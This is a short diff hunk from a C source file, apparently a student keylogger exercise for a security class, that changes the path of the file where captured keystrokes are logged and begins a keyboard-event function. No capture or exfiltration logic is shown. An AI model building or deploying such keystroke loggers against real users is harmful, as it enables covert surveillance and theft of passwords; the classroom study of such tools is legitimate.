@@ -9,7 +9,7 @@
 #include <xkbcommon/xkbcommon.h>
 
 //aqui se va a guardar la cadena 
-#define LOGFILEPATH "E:\\Practicas\\ClaseSI\\Keylogger\\claseSI\\keylogger\\keylogger.txt"
+#define LOGFILEPATH "E:\\Practicas\\ClaseSI\\Keylogger\\keylogger.txt"
 
 // Función para obtener el evento del teclado
 char* getEvent() {
